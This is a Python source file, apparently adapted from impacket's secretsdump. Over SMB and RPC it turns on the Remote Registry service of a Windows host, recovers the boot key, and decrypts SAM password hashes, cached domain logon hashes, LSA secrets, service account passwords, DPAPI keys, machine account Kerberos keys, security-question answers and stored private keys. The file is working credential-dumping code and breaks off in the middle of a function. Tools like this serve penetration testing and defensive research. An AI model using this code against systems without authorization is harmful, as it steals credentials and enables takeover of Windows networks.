import hashlib
import ntpath
import logging
import time
import re
import json
import codecs
from datetime import datetime
from struct import unpack, pack
from six import b

from impacket import ntlm
from impacket.ese import getUnixTime
from impacket import LOG
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst
from impacket.crypto import transformKey
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.structure import hexdump
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key

from impacket.examples.secretsdump import  CryptoCommon, _print_helper, DOMAIN_ACCOUNT_F, SAM_KEY_DATA, SAM_KEY_DATA_AES, ARC4, DES, USER_ACCOUNT_V, SAM_HASH, SAM_HASH_AES, LSA_SECRET_XP, HMAC, MD4, MD5, LSA_SECRET, LSA_SECRET_BLOB, NL_RECORD, DPAPI_SYSTEM, NTDSHashes
from binascii import unhexlify, hexlify

# Helper to create files for exporting
def openFile(fileName, mode='w+', openFileFunc=None):
    if openFileFunc is not None:
        return openFileFunc(fileName, mode)
    else:
        return codecs.open(fileName, mode, encoding='utf-8')

class RemoteOperations:
    def __init__(self, smbConnection, doKerberos, kdcHost=None):
        self.__smbConnection = smbConnection
        if self.__smbConnection is not None:
            self.__smbConnection.setTimeout(5 * 60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__rrp = None
        self.__regHandle = None

        self.__samr = None

        self.__drsr = None
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost

        self.__bootKey = b''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False

        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__scmr = None
        self.__tmpServiceName = None
        self.__serviceDeleted = False


    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def getMachineKerberosSalt(self):
        """
        Returns Kerberos salt for the current connection if
        we have the correct information
        """
        if self.__smbConnection.getServerName() == '':
            # Todo: figure out an RPC call that gives us the domain FQDN
            # instead of the NETBIOS name as NetrWkstaGetInfo does
            return b''
        else:
            host = self.__smbConnection.getServerName()
            domain = self.__smbConnection.getServerDNSDomainName()
            salt = b'%shost%s.%s' % (domain.upper().encode('utf-8'), host.lower().encode('utf-8'), domain.lower().encode('utf-8'))
            return salt

    def getMachineNameAndDomain(self):
        if self.__smbConnection.getServerName() == '':
            # No serverName.. this is either because we're doing Kerberos
            # or not receiving that data during the login process.
            # Let's try getting it through RPC
            rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\wkssvc]')
            rpc.set_smb_connection(self.__smbConnection)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            dce.disconnect()
            return resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1], resp['WkstaInfo']['WkstaInfo100'][
                                                                                      'wki100_langroup'][:-1]
        else:
            return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain, username)
            else:
                return username
        except:
            return None

    def getServiceAccount(self, serviceName):
        try:
            # Open the service
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception as e:
            # Don't log if history service is not found, that should be normal
            if serviceName.endswith("_history") is False:
                LOG.error(e)
            return None

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            LOG.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            LOG.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                LOG.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            LOG.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStop is True:
            LOG.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            LOG.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
        if self.__serviceDeleted is False and self.__tmpServiceName is not None:
            # Check again the service we created does not exist, starting a new connection
            # Why?.. Hitting CTRL+C might break the whole existing DCE connection
            try:
                rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                    rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                # Open SC Manager
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                # Now let's open the service
                resp = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception as e:
                # If service is stopped it'll trigger an exception
                # If service does not exist it'll trigger an exception
                # So. we just wanna be sure we delete it, no need to
                # show this exception message
                pass

    def finish(self):
        if self.__regHandle is not None:
            rrp.hBaseRegCloseKey(self.__rrp, self.__regHandle)
        self.__restore()
        if self.__rrp is not None:
            self.__rrp.disconnect()
        if self.__drsr is not None:
            self.__drsr.disconnect()
        if self.__samr is not None:
            self.__samr.disconnect()
        if self.__scmr is not None:
            try:
                self.__scmr.disconnect()
            except Exception as e:
                if str(e).find('STATUS_INVALID_PARAMETER') >= 0:
                    pass
                else:
                    raise

    def getBootKey(self):
        bootKey = b''
        self.openHKLMHandle()
        for key in ['JD','Skew1','GBG','Data']:
            LOG.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
            bootKey = bootKey + b(ans['lpClassOut'][:-1])
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = unhexlify(bootKey)

        for i in range(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]:transforms[i]+1]

        LOG.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey).decode('utf-8'))

        return self.__bootKey

    def openHKLMHandle(self):
        if self.__regHandle is None:
            ans = rrp.hOpenLocalMachine(self.__rrp)
            self.__regHandle = ans['phKey']

    def retrieveSubKey(self, subKey, value, throttle=0):
        LOG.debug(f'[{datetime.now()}] Retrieving {subKey}\\{value}')
        self.openHKLMHandle()
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
                                   samDesired=None)
        except:
            raise Exception(f"Can't open {subKey} subKey")
        keyHandle = ans['phkResult']
        value = rrp.hBaseRegQueryValue(self.__rrp, ans['phkResult'], value)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        time.sleep(throttle)
        return value

    def enumSubKey(self, subKey, throttle=0):
        LOG.debug(f'[{datetime.now()}] Enumerating keys {subKey}')
        self.openHKLMHandle()
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
                                   samDesired=None)
        except:
            raise Exception(f"Can't open {subKey} subKey")
        keyHandle = ans['phkResult']
        i = 0
        values = []
        while True:
            try:
                key = rrp.hBaseRegEnumKey(self.__rrp, keyHandle, i)
                i += 1
                values.append(key['lpNameOut'][:-1])
            except Exception:
                break
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        time.sleep(throttle)
        return values

    def enumValues(self, subKey:str, throttle=0) -> dict:
        LOG.debug(f'[{datetime.now()}] Enumerating values {subKey}')
        self.openHKLMHandle()
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
                                   samDesired=None)
        except:
            raise Exception(f"Can't open {subKey} subKey")
        keyHandle = ans['phkResult']
        i = 0
        values = dict()
        while True:
            try:
                ans2 = rrp.hBaseRegEnumValue(self.__rrp, keyHandle, i)
                lp_value_name = ans2['lpValueNameOut'][:-1]
                if len(lp_value_name) == 0:
                    lp_value_name = '(Default)'
                lp_type = ans2['lpType']
                lp_data = b''.join(ans2['lpData'])
                values[lp_value_name] = self.__parse_lp_data(lp_type, lp_data)
                i += 1
            except rrp.DCERPCSessionError as e:
                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
                    break
        time.sleep(throttle)
        return values

    def __parse_lp_data(self, valueType, valueData):
        try:
            if valueType == rrp.REG_SZ or valueType == rrp.REG_EXPAND_SZ:
                if type(valueData) is int:
                    return None
                else:
                    return valueData.decode('utf-16le')[:-1]
            elif valueType == rrp.REG_BINARY:
                return valueData
            elif valueType == rrp.REG_DWORD:
                return unpack('<L', valueData)[0]
            elif valueType == rrp.REG_QWORD:
                return unpack('<Q', valueData)[0]
            elif valueType == rrp.REG_NONE:
                return valueData
            elif valueType == rrp.REG_MULTI_SZ:
                return valueData.decode('utf-16le')[:-2]
            else:
                print("Unknown Type 0x%x!" % valueType)
                hexdump(valueData)
        except Exception as e:
            logging.debug('Exception thrown when printing reg value %s' % str(e))
            print('Invalid data')
            pass

class SAMHashes():
    def __init__(self, bootKey, perSecretCallback = lambda secret: _print_helper(secret), remoteOps:RemoteOperations=None, throttle=0):
        self.__remoteOps = remoteOps
        self.__hashedBootKey = b''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}
        self.__perSecretCallback = perSecretCallback
        self.__throttle = throttle

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        LOG.debug('Calculating HashedBootKey from SAM')
        QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = b"0123456789012345678901234567890123456789\0"

        F = self.__remoteOps.retrieveSubKey(r'SAM\SAM\Domains\Account', 'F', throttle=self.__throttle)[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        if domainData['Key0'][0:1] == b'\x01':
            samKeyData = SAM_KEY_DATA(domainData['Key0'])

            rc4Key = self.MD5(samKeyData['Salt'] + QWERTY + self.__bootKey + DIGITS)
            rc4 = ARC4.new(rc4Key)
            self.__hashedBootKey = rc4.encrypt(samKeyData['Key'] + samKeyData['CheckSum'])

            # Verify key with checksum
            checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

            if checkSum != self.__hashedBootKey[16:]:
                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

        elif domainData['Key0'][0:1] == b'\x02':
            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])

            self.__hashedBootKey = self.__cryptoCommon.decryptAES(self.__bootKey,
                                                                  samKeyData['Data'][:samKeyData['DataLen']], samKeyData['Salt'])

    def __decryptHash(self, rid, cryptedHash, constant, newStyle = False):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        if newStyle is False:
            rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L", rid) + constant )
            rc4 = ARC4.new(rc4Key)
            key = rc4.encrypt(cryptedHash['Hash'])
        else:
            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dump(self):
        NTPASSWORD = b"NTPASSWORD\0"
        LMPASSWORD = b"LMPASSWORD\0"

        LOG.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
        self.getHBootKey()

        usersKey = r'SAM\SAM\Domains\Account\Users'

        # Enumerate all the RIDs
        rids = self.__remoteOps.enumSubKey(usersKey, throttle=self.__throttle)
        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.__remoteOps.retrieveSubKey(ntpath.join(usersKey, rid), 'V', throttle=self.__throttle)[1])
            rid = int(rid, 16)

            V = userAccount['Data']

            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['NTHashLength'] == 0:
                logging.error('SAM hashes extraction for user %s failed. The account doesn\'t have hash information.' % userName)
                continue

            encNTHash = b''
            if V[userAccount['NTHashOffset']:][2:3] == b'\x01':
                # Old Style hashes
                newStyle = False
                if userAccount['LMHashLength'] == 20:
                    encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                if userAccount['NTHashLength'] == 20:
                    encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
            else:
                # New Style hashes
                newStyle = True
                if userAccount['LMHashLength'] == 24:
                    encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])

            LOG.debug('NewStyle hashes is: %s' % newStyle)
            if userAccount['LMHashLength'] >= 20:
                lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD, newStyle)
            else:
                lmHash = b''

            if encNTHash != b'':
                ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD, newStyle)
            else:
                ntHash = b''

            if lmHash == b'':
                lmHash = ntlm.LMOWFv1('','')
            if ntHash == b'':
                ntHash = ntlm.NTOWFv1('','')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
            self.__itemsFound[rid] = answer
            self.__perSecretCallback(answer)

    def export(self, baseFileName, openFileFunc = None):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fileName = baseFileName + '.sam'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in items:
                fd.write(self.__itemsFound[item] + '\n')
            fd.close()
            return fileName

class LSASecrets():
    UNKNOWN_USER = '(Unknown User)'
    class SECRET_TYPE:
        LSA = 0
        LSA_HASHED = 1
        LSA_RAW = 2
        LSA_KERBEROS = 3

    def __init__(self, bootKey, remoteOps:RemoteOperations=None, history=False,
                 perSecretCallback=lambda secretType, secret: _print_helper(secret), throttle=0):
        self.__bootKey = bootKey
        self.__LSAKey = b''
        self.__NKLMKey = b''
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []
        self.__perSecretCallback = perSecretCallback
        self.__history = history
        self.__throttle = throttle

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(rounds):
            sha.update(value)
        return sha.digest()

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = b''

        encryptedSecretSize = unpack('<I', value[:4])[0]
        value = value[len(value)-encryptedSecretSize:]

        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            key0 = key0[7:]
            value = value[8:]
            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return secret['Secret']

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv,MD5)
        rc4key = hmac_md5.digest()

        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]

        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        LOG.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.__remoteOps.retrieveSubKey(r'SECURITY\Policy\PolEKList', '', throttle=self.__throttle)
        if value is None:
            LOG.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.__remoteOps.retrieveSubKey(r'SECURITY\Policy\PolSecretEncryptionKey', '', throttle=self.__throttle)
            self.__vistaStyle = False
            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        LOG.debug('Decrypting NL$KM')
        value = self.__remoteOps.retrieveSubKey(r'SECURITY\Policy\Secrets\NL$KM\CurrVal', '', throttle=self.__throttle)
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):

        LOG.info('Dumping cached domain logon information (domain/username:hash)')

        # Let's first see if there are cached entries
        values = self.__remoteOps.enumValues(r'SECURITY\Cache', throttle=self.__throttle)
        if values is None:
            # No cache entries
            return
        try:
            # Remove unnecessary value
            del values['NL$Control']
        except:
            pass

        iterationCount = 10240

        if values.get('NL$IterationCount', None):
            record = values.get('NL$IterationCount')
            del values['NL$IterationCount']

            if record > 10240:
                iterationCount = record & 0xfffffc00
            else:
                iterationCount = record * 1024

        self.__getLSASecretKey()
        self.__getNLKMSecret()
        LOG.debug(f'LsaSecretKey: 0x{hexlify(self.__LSAKey).decode()}')
        LOG.debug(f'NKLM Secret: 0x{hexlify(self.__NKLMKey).decode()}')

        for key, value in values.items():
            LOG.debug(f'Looking into {key}')
            record = NL_RECORD(value)
            if record['IV'] != 16 * b'\x00':
            #if record['UserLength'] > 0:
                if record['Flags'] & 1 == 1:
                    # Encrypted
                    if self.__vistaStyle is True:
                        plainText = self.__cryptoCommon.decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['IV'])
                    else:
                        plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['IV'])
                        pass
                else:
                    # Plain! Until we figure out what this is, we skip it
                    #plainText = record['EncryptedData']
                    continue
                encHash = plainText[:0x10]
                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']) + self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['DnsDomainNameLength'])].decode('utf-16le')
                timestamp = datetime.utcfromtimestamp(getUnixTime(record['LastWrite']))

                if self.__vistaStyle is True:
                    answer = "%s/%s:$DCC2$%s#%s#%s: (%s)" % (domainLong, userName, iterationCount, userName, hexlify(encHash).decode('utf-8'), timestamp)
                else:
                    answer = "%s/%s:%s:%s: (%s)" % (domainLong, userName, hexlify(encHash).decode('utf-8'), userName, timestamp)

                self.__cachedItems.append(answer)
                self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_HASHED, answer)

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            LOG.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith(b'\x00\x00'):
            LOG.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        LOG.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                if hasattr(self.__remoteOps, 'getServiceAccount'):
                    account = self.__remoteOps.getServiceAccount(name[4:])
                    if account is None:
                        secret = self.UNKNOWN_USER + ':'
                    else:
                        secret =  "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = self.UNKNOWN_USER + ':'
                secret += strDecoded

        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                if hasattr(self.__remoteOps, 'getDefaultLoginAccount'):
                    account = self.__remoteOps.getDefaultLoginAccount()
                    if account is None:
                        secret = self.UNKNOWN_USER + ':'
                    else:
                        secret = "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = self.UNKNOWN_USER + ':'
                secret += strDecoded

        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET: %s' % strDecoded

        elif upperName.startswith('DPAPI_SYSTEM'):
            # Decode the DPAPI Secrets
            dpapi = DPAPI_SYSTEM(secretItem)
            secret = "dpapi_machinekey:0x{0}\ndpapi_userkey:0x{1}".format( hexlify(dpapi['MachineKey']).decode('latin-1'),
                                                               hexlify(dpapi['UserKey']).decode('latin-1'))
        elif upperName.startswith('$MACHINE.ACC'):
            # compute MD4 of the secret.. yes.. that is the nthash? :-o
            md4 = MD4.new()
            md4.update(secretItem)
            if hasattr(self.__remoteOps, 'getMachineNameAndDomain'):
                machine, domain = self.__remoteOps.getMachineNameAndDomain()
                printname = "%s\\%s$" % (domain, machine)
                secret = "%s\\%s$:%s:%s:::" % (domain, machine, hexlify(ntlm.LMOWFv1('','')).decode('utf-8'),
                                               hexlify(md4.digest()).decode('utf-8'))
            else:
                printname = "$MACHINE.ACC"
                secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')).decode('utf-8'),
                                                hexlify(md4.digest()).decode('utf-8'))
            # Attempt to calculate and print Kerberos keys
            if not self.__printMachineKerberos(secretItem, printname):
                LOG.debug('Could not calculate machine account Kerberos keys, only printing plain password (hex encoded)')
            # Always print plaintext anyway since this may be needed for some popular usecases
            extrasecret = "%s:plain_password_hex:%s" % (printname, hexlify(secretItem).decode('utf-8'))
            self.__secretItems.append(extrasecret)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, extrasecret)

        elif re.match(r'^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName) is not None:
            # Decode stored security questions
            sid = re.search(r'^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName).group(1)
            try:
                strDecoded = secretItem.decode('utf-16le')
                strDecoded = json.loads(strDecoded)
            except Exception as e:
                pass
            else:
                output = []
                if strDecoded['version'] == 1:
                    if len(strDecoded['questions']) != 0:
                        output.append(" - Version : %d" % strDecoded['version'])
                        for qk in strDecoded['questions']:
                            output.append(" | Question: %s" % qk['question'])
                            output.append(" | |--> Answer: %s" % qk['answer'])
                        output = '\n'.join(output)
                        secret = 'Security questions for user %s: \n%s' % (sid, output)
                    else:
                        secret = 'Empty security questions for user %s.' % sid
                else:
                    LOG.warning("Unknown SQSA version (%s), please open an issue with the following data so we can add a parser for it." % str(strDecoded['version']))
                    LOG.warning("Don't forget to remove sensitive content before sending the data in a Github issue.")
                    secret = json.dumps(strDecoded, indent=4)

        elif re.match('^SCM:{([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})}', upperName) is not None:
            # Decode stored service password
            sid = re.search('^SCM:{([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})}', upperName).group(1)
            try:
                password = secretItem.decode('utf-16le').rstrip('\x00')
            except:
                pass
            else:
                secret = 'Password of service %s: %s' % (sid, password)

        elif re.match(r'^L\$([0-9A-Z]{3})-PRV-([0-9A-F]{32})$', upperName) is not None:
            # Decode stored OpenGPG private key
            keyid = re.search(r'^L\$([0-9A-Z]{3})-PRV-([0-9A-F]{32})$', upperName).group(2)
            try:
                b64key = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'OpenGPG private key %s: \n%s' % (keyid, b64key)
        elif re.match(r'^L\$([0-9A-Z]{3})-PUB-([0-9A-F]{32})$', upperName) is not None:
            # Decode stored OpenGPG public key
            keyid = re.search(r'^L\$([0-9A-Z]{3})-PUB-([0-9A-F]{32})$', upperName).group(2)
            try:
                b64key = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'OpenGPG public key %s: \n%s' % (keyid, b64key)

        if secret != '':
            printableSecret = secret
            self.__secretItems.append(secret)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, printableSecret)
        else:
            # Default print, hexdump
            printableSecret  = '%s:%s' % (name, hexlify(secretItem).decode('utf-8'))
            self.__secretItems.append(printableSecret)
            # If we're using the default callback (ourselves), we print the hex representation. If not, the
            # user will need to decide what to do.
            if self.__module__ == self.__perSecretCallback.__module__:
                hexdump(secretItem)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_RAW, printableSecret)

    def __printMachineKerberos(self, rawsecret, machinename):
        # Attempt to create Kerberos keys from machine account (if possible)
        if hasattr(self.__remoteOps, 'getMachineKerberosSalt'):
            salt = self.__remoteOps.getMachineKerberosSalt()
            if salt == b'':
                return False
            else:
                allciphers = [
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.des_cbc_md5.value)
                ]
                # Ok, so the machine account password is in raw UTF-16, BUT can contain any amount
                # of invalid unicode characters.
                # This took me (Dirk-jan) way too long to figure out, but apparently Microsoft
                # implicitly replaces those when converting utf-16 to utf-8.
                # When we use the same method we get the valid password -> key mapping :)
                rawsecret = rawsecret.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
                for etype in allciphers:
                    try:
                        key = string_to_key(etype, rawsecret, salt, None)
                    except Exception:
                        LOG.debug('Exception', exc_info=True)
                        raise
